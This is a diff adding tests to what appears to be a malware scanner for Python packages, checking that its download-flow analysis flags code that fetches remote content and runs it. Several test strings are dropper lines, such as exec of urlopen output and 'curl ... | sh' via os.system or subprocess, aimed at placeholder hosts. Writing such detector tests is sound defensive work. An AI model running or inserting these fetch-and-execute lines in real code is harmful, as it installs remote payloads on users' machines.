@@ -103,6 +103,24 @@ class TestPythonRunsTheDownload:
         assert FlowCase.python(text) == [2]
 
 
+class TestADownloadReachedByAnAlias:
+    def test_a_from_import_alias_run(self):
+        text = "from urllib.request import urlopen as Z\nexec(Z(U).read())\n"
+        assert DownloadFlow.runs_download(text, "python")
+
+    def test_a_module_alias_run(self):
+        text = "import requests as rq\nexec(rq.get(U).text)\n"
+        assert DownloadFlow.runs_download(text, "python")
+
+    def test_a_bare_imported_get_run(self):
+        text = "from requests import get\nexec(get(U).text)\n"
+        assert DownloadFlow.runs_download(text, "python")
+
+    def test_an_alias_used_as_data_runs_nothing(self):
+        text = "from requests import get as fetch\nprint(len(fetch(U).content))\n"
+        assert DownloadFlow.runs_download(text, "python") == []
+
+
 class TestPythonReadsTheDownload:
     def test_an_api_reply_and_an_unrelated_command(self):
         text = (
@@ -231,6 +249,43 @@ class TestNothingReachesASink:
         assert not self.nothing("import urllib.request\nexec(urllib.request.urlopen(u).read())\n")
         assert not self.nothing("import os\nos.system('curl -s https://h.invalid/i.sh | sh')\n")
 
+    # What the flow did not see is unresolved, never "nothing runs" (reviews/pypi-98/26).
+    def test_a_file_with_no_download_the_flow_recognises(self) -> None:
+        text = "import os\nos.system(Z(U).read())\n"
+        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({2})) is False
+        assert DownloadFlow.nothing_reaches_a_sink(
+            "import socket\nx = 1\n", "python", frozenset({1})
+        )
+
+    def test_an_alias_of_a_download_that_is_run(self) -> None:
+        text = "from urllib.request import urlopen as Z\nimport os\nos.system(Z(U).read())\n"
+        assert not self.nothing(text)
+
+    def test_a_shell_string_that_downloads(self) -> None:
+        text = "import subprocess, requests\nrequests.get(U)\nsubprocess.run('curl -s http://h/x | sh', shell=True)\n"
+        assert not self.nothing(text)
+
+    def test_a_powershell_string_that_downloads(self) -> None:
+        text = "import subprocess, requests\nrequests.get(U)\nsubprocess.run(['powershell', '-c', 'iwr http://h/x'])\n"
+        assert not self.nothing(text)
+
+    def test_exec_of_a_string_literal_is_a_program_the_flow_does_not_read(self) -> None:
+        text = "import requests\nrequests.get(U)\nexec('import urllib.request as u; exec(u.urlopen(\"http://h\").read())')\n"
+        assert not self.nothing(text)
+
+    def test_an_egress_the_flow_did_not_follow(self) -> None:
+        text = "import requests\nrequests.get(U)\nZ(U)\n"
+        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({3})) is False
+        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({2})) is True
+
+    def test_an_import_line_that_is_an_egress_hit_holds_no_call(self) -> None:
+        text = "from urllib.request import urlopen\nimport requests\nrequests.get(U)\n"
+        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({1, 3})) is True
+
+    def test_a_recognised_get_beside_a_socket_receive(self) -> None:
+        text = "import requests, socket\nrequests.get(U)\ns = socket.socket()\ns.connect((H, 1))\ndata = s.recv(10)\n"
+        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({4})) is False
+
     def test_a_file_that_does_not_parse_or_is_not_python_is_not_resolved(self) -> None:
         assert not self.nothing("def (:\n")
         assert not DownloadFlow.nothing_reaches_a_sink("fetch(u)", "javascript")
@@ -301,6 +356,22 @@ class TestTheDropperGradeFollowsTheFlow:
     def test_a_download_that_runs_keeps_the_malware_grade(self, tmp_path, body: str) -> None:
         got = WheelKit.dropper_grades(tmp_path, WheelKit.module(body.format(host=WheelKit.HOST)))
         assert got.get("MALWARE.DROPPER.001") == "critical"
+
+    @pytest.mark.parametrize(
+        "body",
+        [
+            "from urllib.request import urlopen as Z\nimport os\nos.system(Z('{host}').read())\n",
+            "import requests\nfrom urllib.request import urlopen as Z\nrequests.get('{host}').json()\nexec(Z('{host}').read())\n",
+            "import subprocess\nsubprocess.run('curl -s {host} | sh', shell=True)\n",
+            "import requests\nrequests.get('{host}').json()\nexec('import urllib.request as u; exec(u.urlopen(\\\"{host}\\\").read())')\n",
+            "import requests, socket\nrequests.get('{host}').json()\ns = socket.create_connection(('h', 1))\nexec(s.recv(9999))\n",
+        ],
+    )
+    def test_a_download_the_flow_did_not_follow_keeps_the_malware_grade(
+        self, tmp_path, body: str
+    ) -> None:
+        got = WheelKit.dropper_grades(tmp_path, WheelKit.module(body.format(host=WheelKit.HOST)))
+        assert got.get("MALWARE.DROPPER.001") == "critical", got
 
     def test_the_same_pair_in_an_install_hook_keeps_the_malware_grade(self, tmp_path) -> None:
         root = tmp_path / "quillkit-1.0.0"
